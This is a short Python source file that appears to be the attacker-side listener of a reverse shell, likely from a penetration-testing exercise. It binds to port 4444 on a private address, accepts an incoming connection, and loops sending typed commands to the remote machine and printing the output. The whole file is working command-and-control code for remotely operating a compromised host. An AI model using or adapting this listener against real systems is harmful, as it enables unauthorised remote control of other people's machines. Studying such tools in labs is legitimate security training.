import socket


class Listener:
    def __init__(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("192.168.157.128", 4444))
        listener.listen(0)
        print("waiting for connection")
        self.connection, self.address = listener.accept()
        print("connected now with " + str(self.address))

    def runner(self):
        while True:
            command = str(input("Enter the CMD"))
            if "STOP" in command:
                break
            self.connection.send(command.encode())
            result = self.connection.recv(1024)
            print(result)
        print("Connection has ended from both sides")